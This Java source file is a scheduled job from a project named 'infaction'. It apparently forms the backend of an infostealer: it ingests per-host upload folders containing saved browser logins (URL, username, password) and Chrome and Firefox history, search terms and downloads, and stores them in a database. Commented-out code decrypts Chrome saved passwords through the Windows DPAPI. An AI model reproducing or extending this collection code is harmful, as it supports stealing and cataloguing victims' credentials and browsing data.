package com.jimmy.infaction.job;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.jimmy.infaction.common.*;
import com.jimmy.infaction.pojo.*;
import com.jimmy.infaction.service.*;
import com.sun.jna.platform.win32.Crypt32Util;
import org.apache.ibatis.annotations.Param;
import org.quartz.Job;
import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;
import org.quartz.SchedulerException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationContext;


import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * @author jimmy on 2019/9/26 17:50
 */
public class DeBagJob  implements  Job {

	private static Logger log = LoggerFactory.getLogger(DeBagJob.class);

	@Override
	public void execute(JobExecutionContext jobContext) throws JobExecutionException {
		ApplicationContext applicationContext = null;
		try {
			//get sping context
			applicationContext = getApplicationContext(jobContext);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		//find xml register beanservice
		ObjectMapper jsonMapper = (ObjectMapper) applicationContext.getBean("jsonMapper");
		MachineService machineService = (MachineService) applicationContext.getBean("machineService");
		BrowserService browserService = (BrowserService) applicationContext.getBean("browserService");
		BrowserDownloadService browserDownloadService = (BrowserDownloadService) applicationContext.getBean("browserDownloadService");
		BrowserKeywordService browserKeywordService = (BrowserKeywordService) applicationContext.getBean("browserKeywordService");
		BrowserUrlService browserUrlService = (BrowserUrlService) applicationContext.getBean("browserUrlService");
//		String rootPath = "F:\\workspace\\infaction\\upload\\";
		String rootPath = "/opt/tomcat/webapps/upload/";
		File dir = new File(rootPath);
		File[] files = dir.listFiles();
		for (File f : files) {
			if (!(f.getName().matches(".*.zip")) && !(f.getName().matches(".*.txt")) && !(f.getName().matches(".*img")) ) {
				String hostid = f.getName().substring(0,36);
				String brtype =  f.getName().substring((f.getName().lastIndexOf("-"))+1);
				if (brtype.equals("fire")){
					File newPath = new File(f.toPath() + File.separator + "fire");
					String[] firelist =  newPath.list();
					// move
					if (firelist.length> 0){
						for(int i=0;i<firelist.length;i++){
//							new File(newPath+"\\"+firelist[i]).renameTo(new File(f.toPath()+"\\"+firelist[i]));
							new File(newPath+"/"+firelist[i]).renameTo(new File(f.toPath()+"/"+firelist[i]));
						}
					}
//					newPath.delete();
//					System.out.println(newPath);
				}
				boolean exist = machineService.isExist(hostid);
				// full delete before  full  insert
				if (exist){
					browserService.deleteExit(hostid,brtype);
					browserDownloadService.deleteExit(hostid,brtype);
					browserKeywordService.deleteExit(hostid,brtype);
					browserUrlService.deleteExit(hostid,brtype);
				}
				for (File ff : f.listFiles()) {
					int num = 10; //初始线程数
					try {
						switch (ff.getName()) {
							case "login.txt":
//								File file = new File(rootPath + f.getName()+"\\" +"login.txt");
								File file = new File(rootPath + f.getName()+"/" +"login.txt");
								InputStreamReader read = null;
								BufferedReader reader = null;
								try {
									read = new InputStreamReader(new FileInputStream(file), "utf-8");
									reader = new BufferedReader(read);
									String line;
									while ((line = reader.readLine()) != null) {
										if (line.equals("")) ;
										else {
											Browser browser = new Browser();
											Map map = jsonMapper.readValue(line, Map.class);
											browser.setOrigin_url((String) map.get("origin_url"));
											browser.setAction_url((String) map.get("action_url"));
											browser.setUser((String) map.get("user"));
											browser.setPassword((String) map.get("password"));
											browser.setBrwtype(brtype);
											browser.setHostid(hostid);
											browserService.insert(browser);
										}
									}
									read.close();
									file.delete();
								} catch (UnsupportedEncodingException e) {
									e.printStackTrace();
								} catch (IOException e) {
									e.printStackTrace();
								} finally {
									read.close();
								}
								break;
							case "History":
								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"/"+"History");
//								SqliteHelper hi = new SqliteHelper(rootPath + f.getName() + "\\" + "History");
								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
								int klength = HkList.size();
								int kbaseNum = klength / num;
								int kremainderNum = klength % num;
								int kend = 0;
								for (int i = 0; i < num; i++) {
									int start = kend;
									kend = start + kbaseNum;
									if (i == (num - 1)) {
										kend = klength;
									} else if (i < kremainderNum) {
										kend = kend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HkList, start, kend, hostid,brtype, browserKeywordService);
									thread.start();
								}
								List<HistoryUrlResult> HList = hi.executeQueryList("Select url, title, visit_count FROM urls", HistoryUrlResult.class);
								int length = HList.size();
								int baseNum = length / num;
								int remainderNum = length % num;
								int end = 0;
								for (int ki = 0; ki < num; ki++) {
									int start = end;
									end = start + baseNum;
									if (ki == (num - 1)) {
										end = length;
									} else if (ki < remainderNum) {
										end = end + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (ki + 1) + "] ", HList, start, end, hostid,brtype, browserUrlService);
									thread.start();
								}
								List<HistoryDownloadResult> HdList = hi.executeQueryList("Select  current_path,tab_url FROM downloads", HistoryDownloadResult.class);
								int dlength = HdList.size();
								int dbaseNum = dlength / num;
								int dremainderNum = dlength % num;
								int dend = 0;
								for (int di = 0; di < num; di++) {
									int start = dend;
									dend = start + dbaseNum;
									if (di == (num - 1)) {
										dend = dlength;
									} else if (di < dremainderNum) {
										dend = dend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (di + 1) + "] ", HdList, start, dend, hostid,brtype, browserDownloadService);
									thread.start();
								}
								ff.delete();
								break;
//								System.out.println("----"+(System.currentTimeMillis() - start));
							case "places.sqlite(1)":
								SqliteHelper fi = new SqliteHelper(rootPath + f.getName() + "/" + "places.sqlite(1)");
//								SqliteHelper fi = new SqliteHelper(rootPath + f.getName() + "\\" + "places.sqlite(1)");
								List<HistoryUrlResult> FList = fi.executeQueryList("Select url, title, visit_count FROM moz_places where title !='' ", HistoryUrlResult.class);
								int flength = FList.size();
								int fbaseNum = flength / num;
								int fremainderNum = flength % num;
								int fend = 0;
								for (int i = 0; i < num; i++) {
									int start = fend;
									fend = start + fbaseNum;
									if (i == (num - 1)) {
										fend = flength;
									} else if (i < fremainderNum) {
										fend = fend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", FList, start, fend, hostid,brtype, browserUrlService);
									thread.start();
								}
								ff.delete();
								break;
							case "places.sqlite":
								SqliteHelper ffi = new SqliteHelper(rootPath + f.getName() + "/" + "places.sqlite");
//								SqliteHelper ffi = new SqliteHelper(rootPath + f.getName() + "\\" + "places.sqlite");
								List<HistoryUrlResult> FfList = ffi.executeQueryList("Select url, title, visit_count FROM moz_places where title !='' ", HistoryUrlResult.class);
								int fflength = FfList.size();
								int ffbaseNum = fflength / num;
								int ffremainderNum = fflength % num;
								int ffend = 0;
								for (int i = 0; i < num; i++) {
									int start = ffend;
									ffend = start + ffbaseNum;
									if (i == (num - 1)) {
										ffend = fflength;
									} else if (i < ffremainderNum) {
										ffend = ffend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", FfList, start, ffend, hostid,brtype, browserUrlService);
									thread.start();
								}
								ff.delete();
								break;
							case "Cookies":
								ff.delete();
								break;
//								System.out.println(ff.getName());
							default:
								ff.delete();
								continue;
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				f.delete();
			}
		}
	}

	private static final String APPLICATION_CONTEXT_KEY = "applicationContextKey";

	private ApplicationContext getApplicationContext(JobExecutionContext jobContext) throws SchedulerException {
		ApplicationContext appCtx = null;
		appCtx = (ApplicationContext) jobContext.getScheduler().getContext().get(APPLICATION_CONTEXT_KEY);
		if (appCtx == null) {
			throw new JobExecutionException("No application context available in scheduler context for key \"" + APPLICATION_CONTEXT_KEY + "\"");
		}
		return appCtx;
	}

	class ExecMultiBag extends Thread {
		private String threadName;
		private List<HistoryKeyResult> hklist;
		private List<HistoryUrlResult> hllist;
		private List<HistoryDownloadResult> hdlist;
		private List<SqlLiteDemoResult> Llist;
		private BrowserUrlService browserUrlService;
		private BrowserDownloadService browserDownloadService;
		private BrowserKeywordService browserKeywordService;
		private BrowserService browserService;
		private int startIndex;
		private int endIndex;
		private String hostid;
		private String brtype;

		public ExecMultiBag(String threadName, List list, int startIndex, int endIndex, String hostid,String brtype, Object service) {
			this.threadName = threadName;
			this.hostid = hostid;
			this.startIndex = startIndex;
			this.brtype = brtype;
			this.endIndex = endIndex;
			if (list.toString().matches("(.*)KeyResult(.*)")) {
				this.hklist = list;
				this.browserKeywordService = (BrowserKeywordService) service;
			} else if (list.toString().matches("(.*)UrlResult(.*)")) {
				this.hllist = list;
				this.browserUrlService = (BrowserUrlService) service;
			} else if (list.toString().matches("(.*)DownloadResult(.*)")) {
				this.hdlist = list;
				this.browserDownloadService = (BrowserDownloadService) service;
			}
//			else if(list.toString().matches("(.*)SqlLiteDemoResult(.*)")) {
//				this.Llist = list;
//				this.browserService = (BrowserService) service;
//			}
		}

		@Override
		public void run() {
//			if (null != Llist) {
//				List<SqlLiteDemoResult> LList = Llist.subList(startIndex, endIndex);
//				for (SqlLiteDemoResult result : LList) {
//					Browser browser = new Browser();
//					browser.setWebsite(result.getAction_url());
//					browser.setUser(result.getUsername_value());
//					browser.setPassword(new String(Crypt32Util.cryptUnprotectData(result.getPassword_value())));
//					browser.setPassword(new String(result.getPassword_value()));
//					browser.setHostid(hostid);
//					browserService.insert(browser);
//				}
//			}
			if (null != hklist) {
				List<HistoryKeyResult> kList = hklist.subList(startIndex, endIndex);
//				System.out.println(threadName + "处理了" + kList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
				for (HistoryKeyResult result : kList) {
					Browser_keyword browser_keyword = new Browser_keyword();
					browser_keyword.setKeyword(result.getKey());
					browser_keyword.setBrwtype(brtype);
					browser_keyword.setHostid(hostid);
					browserKeywordService.insert(browser_keyword);
				}
			} else if (null != hllist) {
				List<HistoryUrlResult> lList = hllist.subList(startIndex, endIndex);
//				System.out.println(threadName + "处理了" + lList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
				for (HistoryUrlResult result : lList) {
					Browser_url browser_url = new Browser_url();
					browser_url.setWebsite(result.getWebsite());
					browser_url.setTitle(result.getTitle());
					browser_url.setVisit(result.getVisit());
					browser_url.setBrwtype(brtype);
					browser_url.setHostid(hostid);
					browserUrlService.insert(browser_url);
				}
			} else if (null != hdlist) {
				List<HistoryDownloadResult> dList = hdlist.subList(startIndex, endIndex);
//				System.out.println(threadName + "处理了" + dList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
				for (HistoryDownloadResult result : dList) {
					Browser_download browser_download = new Browser_download();
					browser_download.setUrl(result.getTab_url());
					browser_download.setPath(result.getCurrent_path());
					browser_download.setBrwtype(brtype);
					browser_download.setHostid(hostid);
					browserDownloadService.insert(browser_download);
				}
			}
		}
	}
}